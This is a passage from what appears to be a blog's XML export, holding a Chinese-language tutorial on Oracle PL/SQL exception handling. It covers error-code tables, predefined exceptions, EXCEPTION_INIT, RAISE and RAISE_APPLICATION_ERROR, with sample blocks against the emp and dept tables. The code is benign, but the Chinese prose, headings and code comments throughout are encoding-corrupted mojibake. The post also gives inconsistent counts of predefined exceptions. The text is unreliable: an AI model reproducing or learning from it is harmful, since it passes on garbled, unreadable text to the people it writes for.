      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsqlå¼‚å¸¸å¤„ç†</title>
    <url>/2019/12/17/Oracle/plsql%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="plsqlå¼‚å¸¸å¤„ç†"><a href="#plsqlå¼‚å¸¸å¤„ç†" class="headerlink" title="plsqlå¼‚å¸¸å¤„ç†"></a>plsqlå¼‚å¸¸å¤„ç†</h1><h2 id="å¼‚å¸¸å¤„ç†çš„æ¦‚å¿µ"><a href="#å¼‚å¸¸å¤„ç†çš„æ¦‚å¿µ" class="headerlink" title="å¼‚å¸¸å¤„ç†çš„æ¦‚å¿µ"></a>å¼‚å¸¸å¤„ç†çš„æ¦‚å¿µ</h2><p>å¼‚å¸¸æƒ…å†µå¤„ç†(EXCEPTION)æ˜¯ç”¨æ¥å¤„ç†æ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ä¸­æœªé¢„æ–™çš„äº‹ä»¶,ç¨‹åºå—çš„å¼‚å¸¸å¤„ç†é¢„å®šä¹‰çš„é”™è¯¯å’Œè‡ªå®šä¹‰é”™è¯¯,ç”±äºPL/SQLç¨‹åºå—ä¸€æ—¦äº§ç”Ÿå¼‚å¸¸è€Œæ²¡æœ‰æŒ‡å‡ºå¦‚ä½•å¤„ç†æ—¶,ç¨‹åºå°±ä¼šè‡ªåŠ¨ç»ˆæ­¢æ•´ä¸ªç¨‹åºè¿è¡Œã€‚</p>
<a id="more"></a>

<p>æœ‰ä¸‰ç§ç±»å‹çš„å¼‚å¸¸é”™è¯¯ :</p>
<table>
<thead>
<tr>
<th align="left">ç±»å‹</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">é¢„å®šä¹‰ ( Predefined )é”™è¯¯</td>
<td align="left">ORACLEé¢„å®šä¹‰çš„å¼‚å¸¸æƒ…å†µå¤§çº¦æœ‰22ä¸ªã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œæ— éœ€åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç”±ORACLEè‡ªåŠ¨å°†å…¶å¼•å‘</td>
</tr>
<tr>
<td align="left">éé¢„å®šä¹‰ ( Predefined )é”™è¯¯</td>
<td align="left">å³å…¶ä»–æ ‡å‡†çš„ORACLEé”™è¯¯ã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œéœ€è¦ç”¨æˆ·åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç„¶åç”±ORACLEè‡ªåŠ¨å°†å…¶å¼•å‘</td>
</tr>
<tr>
<td align="left">ç”¨æˆ·å®šä¹‰(User_define) é”™è¯¯</td>
<td align="left">ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå‡ºç°ç¼–ç¨‹äººå‘˜è®¤ä¸ºçš„éæ­£å¸¸æƒ…å†µã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œéœ€è¦ç”¨æˆ·åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç„¶åæ˜¾å¼åœ°åœ¨ç¨‹åºä¸­å°†å…¶å¼•å‘ã€‚</td>
</tr>
</tbody></table>
<h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„:"></a>ç»“æ„:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXCEPTION </span><br><span class="line">   WHEN first_exception THEN  &lt;code to handle first exception &gt; </span><br><span class="line">   WHEN second_exception THEN  &lt;code to handle second exception &gt; </span><br><span class="line">   WHEN OTHERS THEN  &lt;code to handle others exception &gt; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="ä½œç”¨èŒƒå›´"><a href="#ä½œç”¨èŒƒå›´" class="headerlink" title="ä½œç”¨èŒƒå›´"></a>ä½œç”¨èŒƒå›´</h3><ul>
<li>PL/SQLçš„å¼‚å¸¸æ•è·åªé’ˆå¯¹æ‰§è¡Œéƒ¨åˆ†ï¼Œåœ¨å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸æ˜¯æ— æ³•æ•è·çš„</li>
<li>å¼‚å¸¸å¤„ç†éƒ¨åˆ†æœ¬èº«å¯¼è‡´çš„å¼‚å¸¸åŒæ ·ä¹Ÿæ˜¯æ— æ³•æ•è·çš„ï¼Œè§£å†³æ–¹æ³•å’Œå£°æ˜éƒ¨åˆ†ä¸€æ ·ï¼Œéœ€è¦åœ¨å¤–å±‚è¿›è¡Œæ•è·ã€‚</li>
</ul>
<h3 id="å¼‚å¸¸é”™è¯¯"><a href="#å¼‚å¸¸é”™è¯¯" class="headerlink" title="å¼‚å¸¸é”™è¯¯"></a>å¼‚å¸¸é”™è¯¯</h3><p>æ¯ä¸ªå¼‚å¸¸é”™è¯¯éƒ½åŒ…å«å¼‚å¸¸é”™è¯¯å·ï¼ˆé”™è¯¯ä»£ç ï¼‰å’Œé”™è¯¯æè¿°ä¿¡æ¯</p>
<table>
<thead>
<tr>
<th align="left">é”™è¯¯ä»£ç ï¼ˆé”™è¯¯ä»£ç ï¼‰</th>
<th align="left">é”™è¯¯æè¿°ä¿¡æ¯</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ORA-00001</td>
<td align="left">è¿åå”¯ä¸€çº¦æŸæ¡ä»¶</td>
</tr>
<tr>
<td align="left">ORA-00017</td>
<td align="left">è¯·æ±‚ä¼šè¯ä»¥è®¾ç½®è·Ÿè¸ªäº‹ä»¶</td>
</tr>
<tr>
<td align="left">ORA-00018</td>
<td align="left">è¶…å‡ºæœ€å¤§ä¼šè¯æ•°</td>
</tr>
<tr>
<td align="left">ORA-00019</td>
<td align="left">è¶…å‡ºæœ€å¤§ä¼šè¯è®¸å¯æ•°</td>
</tr>
<tr>
<td align="left">ORA-00020</td>
<td align="left">è¶…å‡ºæœ€å¤§è¿›ç¨‹æ•° ()</td>
</tr>
<tr>
<td align="left">ORA-00021</td>
<td align="left">ä¼šè¯é™„å±äºå…¶å®ƒæŸäº›è¿›ç¨‹ï¼›æ— æ³•è½¬æ¢ä¼šè¯</td>
</tr>
<tr>
<td align="left">ORA-00022</td>
<td align="left">æ— æ•ˆçš„ä¼šè¯ IDï¼›è®¿é—®è¢«æ‹’ç»</td>
</tr>
<tr>
<td align="left">ORA-00023</td>
<td align="left">ä¼šè¯å¼•ç”¨è¿›ç¨‹ç§ç”¨å†…å­˜ï¼›æ— æ³•åˆ†ç¦»ä¼šè¯</td>
</tr>
<tr>
<td align="left">ORA-00024</td>
<td align="left">å•ä¸€è¿›ç¨‹æ¨¡å¼ä¸‹ä¸å…è®¸ä»å¤šä¸ªè¿›ç¨‹æ³¨å†Œ</td>
</tr>
</tbody></table>
<h3 id="é¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†"><a href="#é¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†" class="headerlink" title="é¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†"></a>é¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†</h3><table>
<thead>
<tr>
<th align="left">é”™è¯¯å·</th>
<th align="left">å¼‚å¸¸åç§°</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ORA-0001</td>
<td align="left">DUP_VAL_ON_INDEX</td>
<td align="left">è¯•å›¾ç ´åä¸€ä¸ªå”¯ä¸€æ€§é™åˆ¶</td>
</tr>
<tr>
<td align="left">ORA-0051</td>
<td align="left">TIMEOUT_ON_RESOURCE</td>
<td align="left">åœ¨ç­‰å¾…èµ„æºæ—¶å‘ç”Ÿè¶…æ—¶</td>
</tr>
<tr>
<td align="left">ORA-0061</td>
<td align="left">TRANSACTION_BACKED_OUT</td>
<td align="left">ç”±äºå‘ç”Ÿæ­»é”äº‹åŠ¡è¢«æ’¤æ¶ˆ</td>
</tr>
<tr>
<td align="left">ORA-1001</td>
<td align="left">INVALID_CURSOR</td>
<td align="left">è¯•å›¾ä½¿ç”¨ä¸€ä¸ªæœªæ‰“å¼€çš„æ¸¸æ ‡</td>
</tr>
<tr>
<td align="left">ORA-1012</td>
<td align="left">NOT_LOGGED_ON</td>
<td align="left">æ²¡æœ‰è¿æ¥åˆ°ORACLE</td>
</tr>
<tr>
<td align="left">ORA-1017</td>
<td align="left">LOGIN_DENIED</td>
<td align="left">æ— æ•ˆçš„ç”¨æˆ·å/å£ä»¤</td>
</tr>
<tr>
<td align="left">ORA-1403</td>
<td align="left">NO_DATA_FOUND</td>
<td align="left">SELECT INTOæ²¡æœ‰æ‰¾åˆ°æ•°æ®</td>
</tr>
<tr>
<td align="left">ORA-1422</td>
<td align="left">TOO_MANY_ROWS</td>
<td align="left">SELECT INTO è¿”å›å¤šè¡Œ</td>
</tr>
<tr>
<td align="left">ORA-1476</td>
<td align="left">ZERO_DIVIDE</td>
<td align="left">è¯•å›¾è¢«é›¶é™¤</td>
</tr>
<tr>
<td align="left">ORA-1722</td>
<td align="left">INVALID_NUMBER</td>
<td align="left">è½¬æ¢ä¸€ä¸ªæ•°å­—å¤±è´¥</td>
</tr>
<tr>
<td align="left">ORA-6500</td>
<td align="left">STORAGE_ERROR</td>
<td align="left">å†…å­˜ä¸å¤Ÿæˆ–å†…å­˜è¢«ç ´åå¼•å‘çš„å†…éƒ¨é”™è¯¯</td>
</tr>
<tr>
<td align="left">ORA-6501</td>
<td align="left">PROGRAM_ERROR</td>
<td align="left">å†…éƒ¨é”™è¯¯,éœ€é‡æ–°å®‰è£…æ•°æ®å­—å…¸è§†å›¾å’Œpl/sqlåŒ…</td>
</tr>
<tr>
<td align="left">ORA-6502</td>
<td align="left">VALUE_ERROR</td>
<td align="left">èµ‹å€¼æ“ä½œï¼Œå˜é‡é•¿åº¦ä¸è¶³ï¼Œè§¦å‘è¯¥å¼‚å¸¸</td>
</tr>
<tr>
<td align="left">ORA-6504</td>
<td align="left">ROWTYPE_MISMATCH</td>
<td align="left">å®¿ä¸»æ¸¸æ ‡å˜é‡ä¸ PL/SQLå˜é‡æœ‰ä¸å…¼å®¹è¡Œç±»å‹</td>
</tr>
<tr>
<td align="left">ORA-6511</td>
<td align="left">CURSOR_ALREADY_OPEN</td>
<td align="left">è¯•å›¾æ‰“å¼€ä¸€ä¸ªå·²æ‰“å¼€çš„æ¸¸æ ‡</td>
</tr>
<tr>
<td align="left">ORA-6530</td>
<td align="left">ACCESS_INTO_NULL</td>
<td align="left">è¯•å›¾ä¸ºnull å¯¹è±¡çš„å±æ€§èµ‹å€¼</td>
</tr>
<tr>
<td align="left">ORA-6531</td>
<td align="left">COLLECTION_IS_NULL</td>
<td align="left">è¯•å›¾ç»™æ²¡æœ‰åˆå§‹åŒ–çš„åµŒå¥—è¡¨å˜é‡æˆ–è€…varryå˜é‡èµ‹å€¼</td>
</tr>
<tr>
<td align="left">ORA-6532</td>
<td align="left">SUBSCRIPT_OUTSIDE_LIMIT</td>
<td align="left">å¯¹åµŒå¥—æˆ–varrayç´¢å¼•ä½¿ç”¨äº†è´Ÿæ•°</td>
</tr>
<tr>
<td align="left">ORA-6533</td>
<td align="left">SUBSCRIPT_BEYOND_COUNT</td>
<td align="left">å¯¹åµŒå¥—æˆ–varrayç´¢å¼•çš„å¼•ç”¨å¤§äºé›†åˆä¸­å…ƒç´ çš„ä¸ªæ•°</td>
</tr>
<tr>
<td align="left">ORA-6592</td>
<td align="left">CASE_NOT_FOUND</td>
<td align="left">å½“Caseè¯­å¥çš„Whenå­å¥æ²¡æœ‰åŒ…å«å¿…éœ€åˆ†æ”¯æˆ–è€…Elseå­å¥æ—¶ï¼Œä¼šè§¦å‘è¯¥å¼‚å¸¸ã€‚</td>
</tr>
<tr>
<td align="left">ORA-30625</td>
<td align="left">SELF_IS_NULL</td>
<td align="left">è¯•å›¾åœ¨nullå®ä¾‹ä¸Šè°ƒç”¨æˆå‘˜æ–¹æ³•</td>
</tr>
<tr>
<td align="left">ORA-1410</td>
<td align="left">SYS_INVALID_ROWID</td>
<td align="left">è¯•å›¾å°†æ— æ•ˆçš„å­—ç¬¦ä¸²è½¬åŒ–æˆROWID</td>
</tr>
</tbody></table>
<p>å¯¹äºé¢„å®šä¹‰å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œåªéœ€åœ¨PL/SQLå—çš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†ï¼Œç›´æ¥å¼•ç”¨ç›¸åº”çš„å¼‚å¸¸æƒ…å†µåï¼Œå¹¶å¯¹å…¶å®Œæˆç›¸åº”çš„å¼‚å¸¸é”™è¯¯å¤„ç†å³å¯ã€‚</p>
<h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼š æ›´æ–°æŒ‡å®šå‘˜å·¥å·¥èµ„ï¼Œå¦‚å·¥èµ„å°äº1500ï¼Œåˆ™åŠ 100    </span><br><span class="line"> DECLARE </span><br><span class="line">   v_empno emp.empno%TYPE :&#x3D;7900; </span><br><span class="line">   v_sal    emp.sal%TYPE; </span><br><span class="line">BEGIN </span><br><span class="line">   SELECT sal INTO v_sal FROM emp WHERE empno&#x3D;v_empno; </span><br><span class="line">   IF v_sal&lt;&#x3D;1500 THEN  </span><br><span class="line">        UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno;  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;å‘˜å·¥å·¥èµ„å·²æ›´æ–°!&#39;);      </span><br><span class="line">   ELSE </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;å‘˜å·¥å·¥èµ„å·²ç»è¶…è¿‡è§„å®šå€¼!&#39;); </span><br><span class="line">   END IF;</span><br><span class="line">   EXCEPTION </span><br><span class="line">   WHEN NO_DATA_FOUND THEN   </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;æ•°æ®åº“ä¸­æ²¡æœ‰ç¼–ç ä¸º&#39;||v_empno||&#39;çš„å‘˜å·¥&#39;); </span><br><span class="line">   WHEN TOO_MANY_ROWS THEN </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;ç¨‹åºè¿è¡Œé”™è¯¯!è¯·ä½¿ç”¨æ¸¸æ ‡&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="éé¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†"><a href="#éé¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†" class="headerlink" title="éé¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†"></a>éé¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†</h3><p>é¢„å®šä¹‰çš„å¼‚å¸¸é”™è¯¯å¤§çº¦æœ‰24ä¸ªï¼Œè€Œé”™è¯¯ä»£ç æˆåƒä¸Šä¸‡å¦‚ORA-00020 ã€‚ å¯¹äºè¿™ç±»å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œé¦–å…ˆå¿…é¡»å¯¹éå®šä¹‰çš„ORACLEé”™è¯¯è¿›è¡Œå®šä¹‰</p>
<p><strong>æ­¥éª¤å¦‚ä¸‹ï¼š</strong></p>
<ul>
<li><p>åœ¨PL/SQL å—çš„å£°æ˜éƒ¨åˆ†å®šä¹‰å¼‚å¸¸æƒ…å†µï¼š</p>
<p>&lt;å¼‚å¸¸æƒ…å†µ&gt; EXCEPTION;</p>
</li>
<li><p>å°†å…¶å®šä¹‰å¥½çš„å¼‚å¸¸æƒ…å†µï¼Œä¸æ ‡å‡†çš„ORACLEé”™è¯¯è”ç³»èµ·æ¥ï¼Œä½¿ç”¨EXCEPTION_INITè¯­å¥</p>
<p>PRAGMA EXCEPTION_INIT(&lt;å¼‚å¸¸æƒ…å†µ&gt;, &lt;é”™è¯¯ä»£ç &gt;)ï¼›</p>
</li>
<li><p>åœ¨PL/SQL å—çš„å¼‚å¸¸æƒ…å†µå¤„ç†éƒ¨åˆ†å¯¹å¼‚å¸¸æƒ…å†µåšå‡ºç›¸åº”çš„å¤„ç†ã€‚</p>
</li>
</ul>
<h4 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼šåˆ é™¤æŒ‡å®šéƒ¨é—¨çš„è®°å½•ä¿¡æ¯ï¼Œä»¥ç¡®ä¿è¯¥éƒ¨é—¨æ²¡æœ‰å‘˜å·¥ã€‚   </span><br><span class="line"> DECLARE </span><br><span class="line">   v_deptno dept.deptno%TYPE :&#x3D;&amp;deptno; </span><br><span class="line">   deptno_remaining EXCEPTION; </span><br><span class="line">   PRAGMA EXCEPTION_INIT(deptno_remaining, -2292); </span><br><span class="line">   &#x2F;* -2292 æ˜¯è¿åreferenceså®Œæ•´æ€§çº¦æŸçš„é”™è¯¯ä»£ç  *&#x2F; </span><br><span class="line">BEGIN </span><br><span class="line">   DELETE FROM dept WHERE deptno&#x3D;v_deptno; </span><br><span class="line">EXCEPTION </span><br><span class="line">   WHEN deptno_remaining THEN  </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#39;è¿åæ•°æ®å®Œæ•´æ€§çº¦æŸ!&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="ç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†"><a href="#ç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†"></a>ç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†</h3><p>å½“ä¸ä¸€ä¸ªå¼‚å¸¸é”™è¯¯ç›¸å…³çš„é”™è¯¯å‡ºç°æ—¶ï¼Œå°±ä¼šéšå«è§¦å‘è¯¥å¼‚å¸¸é”™è¯¯ã€‚ç”¨æˆ·å®šä¹‰çš„å¼‚å¸¸é”™è¯¯æ˜¯é€šè¿‡æ˜¾å¼ä½¿ç”¨ RAISE è¯­å¥æ¥è§¦å‘ã€‚å½“å¼•å‘ä¸€ä¸ªå¼‚å¸¸é”™è¯¯æ—¶ï¼Œæ§åˆ¶å°±è½¬å‘åˆ° EXCEPTIONå—å¼‚å¸¸é”™è¯¯éƒ¨åˆ†ï¼Œæ‰§è¡Œé”™è¯¯å¤„ç†ä»£ç ã€‚</p>
<p><strong>æ­¥éª¤å¦‚ä¸‹ ï¼š</strong></p>
<ul>
<li><p>åœ¨PL/SQL å—çš„å£°æ˜éƒ¨åˆ†å®šä¹‰å¼‚å¸¸æƒ…å†µ ï¼š</p>
<p>&lt;å¼‚å¸¸æƒ…å†µ&gt; EXCEPTION;</p>
</li>
<li><p>RAISE &lt;å¼‚å¸¸æƒ…å†µ&gt;</p>
</li>
<li><p>åœ¨PL/SQL å—çš„å¼‚å¸¸æƒ…å†µå¤„ç†éƒ¨åˆ†å¯¹å¼‚å¸¸æƒ…å†µåšå‡ºç›¸åº”çš„å¤„ç†ã€‚</p>
</li>
</ul>
<h4 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹</span><br><span class="line">DECLARE </span><br><span class="line">   v_empno emp.empno%TYPE :&#x3D;&amp;empno; </span><br><span class="line">   no_result  EXCEPTION; </span><br><span class="line">BEGIN </span><br><span class="line">   UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; </span><br><span class="line">   IF SQL%NOTFOUND THEN </span><br><span class="line">      RAISE no_result; </span><br><span class="line">   END IF; </span><br><span class="line">EXCEPTION </span><br><span class="line">   WHEN no_result THEN  </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#39;ä½ çš„æ•°æ®æ›´æ–°è¯­å¥å¤±è´¥äº†!&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="RAISE-APPLICATION-ERRORå‡½æ•°"><a href="#RAISE-APPLICATION-ERRORå‡½æ•°" class="headerlink" title="RAISE_APPLICATION_ERRORå‡½æ•°"></a>RAISE_APPLICATION_ERRORå‡½æ•°</h3><p>è°ƒç”¨DBMS_STANDARD(ORACLEæä¾›çš„åŒ…)åŒ…æ‰€å®šä¹‰çš„RAISE_APPLICATION_ERRORè¿‡ç¨‹ï¼Œå¯ä»¥é‡æ–°å®šä¹‰å¼‚å¸¸é”™è¯¯æ¶ˆæ¯ï¼Œå®ƒä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ç§ä¸ORACLEäº¤äº’çš„æ–¹æ³•ã€‚ é”™è¯¯å·çš„èŒƒå›´æ˜¯-20,000åˆ°-20,999ã€‚é”™è¯¯ä¿¡æ¯æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œæœ€å¤šä¸º2048å­—èŠ‚ã€‚</p>
<h4 id="ç¤ºä¾‹-3"><a href="#ç¤ºä¾‹-3" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼š</span><br><span class="line">declare </span><br><span class="line">      v_deptid  departments.department_id%type :&#x3D; &amp;no; </span><br><span class="line">      v_dname departments.department_name%type; </span><br><span class="line"> begin </span><br><span class="line">      select department_name into v_dname from departments </span><br><span class="line">      where department_id &#x3D; v_deptid; </span><br><span class="line">      dbms_output.put_line(v_dname); </span><br><span class="line"> exception </span><br><span class="line">      when others then </span><br><span class="line">         raise_application_error(-20001 , &#39;department&#39;||v_deptid||&#39; does not exists&#39;); </span><br><span class="line"> end;</span><br></pre></td></tr></table></figure>
<h2 id="å¼‚å¸¸é”™è¯¯ä¼ æ’­"><a href="#å¼‚å¸¸é”™è¯¯ä¼ æ’­" class="headerlink" title="å¼‚å¸¸é”™è¯¯ä¼ æ’­"></a>å¼‚å¸¸é”™è¯¯ä¼ æ’­</h2><p>ç”±äºå¼‚å¸¸é”™è¯¯å¯ä»¥åœ¨å£°æ˜éƒ¨åˆ†å’Œæ‰§è¡Œéƒ¨åˆ†ä»¥åŠå¼‚å¸¸é”™è¯¯éƒ¨åˆ†å‡ºç°ï¼Œå› è€Œåœ¨ä¸åŒéƒ¨åˆ†å¼•å‘çš„å¼‚å¸¸é”™è¯¯ä¹Ÿä¸ä¸€æ ·ã€‚</p>
<p><strong>å¯æ‰§è¡Œéƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š</strong></p>
<p>å½“ä¸€ä¸ªå¼‚å¸¸é”™è¯¯åœ¨æ‰§è¡Œéƒ¨åˆ†å¼•å‘æ—¶ï¼Œæœ‰ä¸‹åˆ—æƒ…å†µï¼š</p>
<ol>
<li>å¦‚æœå½“å‰å—å¯¹è¯¥å¼‚å¸¸é”™è¯¯è®¾ç½®äº†å¤„ç†ï¼Œåˆ™æ‰§è¡Œå®ƒå¹¶æˆåŠŸå®Œæˆè¯¥å—çš„æ‰§è¡Œï¼Œç„¶åæ§åˆ¶è½¬ç»™åŒ…å«å—ã€‚</li>
<li>å¦‚æœæ²¡æœ‰å¯¹å½“å‰å—å¼‚å¸¸é”™è¯¯è®¾ç½®å®šä¹‰å¤„ç†å™¨ï¼Œåˆ™é€šè¿‡åœ¨åŒ…å«å—ä¸­å¼•å‘å®ƒæ¥ä¼ æ’­å¼‚å¸¸é”™è¯¯ã€‚ç„¶åå¯¹è¯¥åŒ…å«å—æ‰§è¡Œæ­¥éª¤1)ã€‚</li>
</ol>
<h3 id="å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š"><a href="#å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š" class="headerlink" title="å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š"></a>å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š</h3><p>å¦‚æœåœ¨å£°æ˜éƒ¨åˆ†å¼•èµ· å¼‚å¸¸ æƒ…å†µï¼Œå³åœ¨å£°æ˜éƒ¨åˆ†å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆè¯¥é”™è¯¯å°±èƒ½å½±å“åˆ°å…¶å®ƒçš„å—</p>
<h4 id="ç¤ºä¾‹-4"><a href="#ç¤ºä¾‹-4" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹1ï¼š</span><br><span class="line">DECLARE </span><br><span class="line">	Abc number(3):&#x3D;â€™abcâ€™; </span><br><span class="line">	--å…¶å®ƒè¯­å¥ </span><br><span class="line">BEGIN </span><br><span class="line">	--å…¶å®ƒè¯­å¥ </span><br><span class="line">	EXCEPTION </span><br><span class="line">	WHEN OTHERS THEN  </span><br><span class="line">	--å…¶å®ƒè¯­å¥ </span><br><span class="line">END; </span><br><span class="line">&#x2F;*</span><br><span class="line">ç”±äºAbc number(3)&#x3D;â€™abcâ€™; å‡ºé”™ï¼Œå°½ç®¡åœ¨EXCEPTIONä¸­è¯´æ˜äº†WHEN OTHERS THENè¯­å¥ï¼Œä½†WHEN OTHERS THENä¹Ÿä¸ä¼šè¢«æ‰§è¡Œã€‚  </span><br><span class="line">*&#x2F;</span><br><span class="line">--ä¾‹2ï¼š</span><br><span class="line">BEGIN </span><br><span class="line"> DECLARE </span><br><span class="line">     Abc number(3):&#x3D;â€™abcâ€™; </span><br><span class="line">     --å…¶å®ƒè¯­å¥ </span><br><span class="line">    BEGIN </span><br><span class="line">     --å…¶å®ƒè¯­å¥ </span><br><span class="line">    EXCEPTION </span><br><span class="line">     WHEN OTHERS THEN  </span><br><span class="line">     --å…¶å®ƒè¯­å¥ </span><br><span class="line">  	END; </span><br><span class="line"> EXCEPTION </span><br><span class="line"> WHEN OTHERS THEN  </span><br><span class="line"> --å…¶å®ƒè¯­å¥ </span><br><span class="line">END; </span><br><span class="line">&#x2F;*</span><br><span class="line">åœ¨è¯¥é”™è¯¯è¯­å¥å—çš„å¤–éƒ¨æœ‰ä¸€ä¸ªå¼‚å¸¸é”™è¯¯ï¼Œåˆ™è¯¥é”™è¯¯èƒ½è¢«æŠ“ä½</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="å¼‚å¸¸å¤„ç†çš„SQLCodeå’ŒSQL-Errm"><a href="#å¼‚å¸¸å¤„ç†çš„SQLCodeå’ŒSQL-Errm" class="headerlink" title="å¼‚å¸¸å¤„ç†çš„SQLCodeå’ŒSQL Errm"></a>å¼‚å¸¸å¤„ç†çš„SQLCodeå’ŒSQL Errm</h2><p>**æ³¨æ„ï¼š **</p>
<ul>
<li>æŸç»™å®šå¼‚å¸¸ï¼ˆå¦‚è‡ªå®šä¹‰ï¼‰åªèƒ½åœ¨å¼‚å¸¸å¤„ç†éƒ¨åˆ†çš„å¤„ç†ä¸€æ¬¡ã€‚å¦‚æœæœ‰å¤šä¸ªå¼‚å¸¸å¤„ç†å™¨ï¼ˆå¤šæ¬¡whenï¼‰ï¼Œåˆ™ä¼šæŠ›å‡ºPLS-00483å¼‚å¸¸ã€‚</li>
<li>SQLCODEè¿”å›å½“å‰çš„é”™è¯¯ä»£ç ï¼ŒSQLERRMè¿”å›å½“å‰çš„é”™è¯¯ä¿¡æ¯ã€‚å¯¹äºç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸SQLCODEè¿”å›å€¼ä¸ºâ€˜1â€™ï¼ŒSQLERRMè¿”å›å€¼ä¸ºâ€˜User-defined Exceptionâ€™</li>
<li>Oracleé”™è¯¯ä¿¡æ¯çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚</li>
<li>SQLCODEå’ŒSQLERRMçš„å€¼å…ˆèµ‹ç»™æœ¬åœ°å˜é‡ï¼Œä¸èƒ½ç›´æ¥ç”¨äºSQLè¯­å¥</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlçº¦æŸ</title>
    <url>/2019/12/17/Oracle/sql%E7%BA%A6%E6%9D%9F/</url>
    <content><![CDATA[<h1 id="sqlçº¦æŸ"><a href="#sqlçº¦æŸ" class="headerlink" title="sqlçº¦æŸ"></a>sqlçº¦æŸ</h1><a id="more"></a>

<table>
<thead>
<tr>
<th align="left">åç§°</th>
<th align="left">å…³é”®å­—</th>
<th align="left">å«ä¹‰</th>
<th align="left">æ‰€å±çº§åˆ«</th>
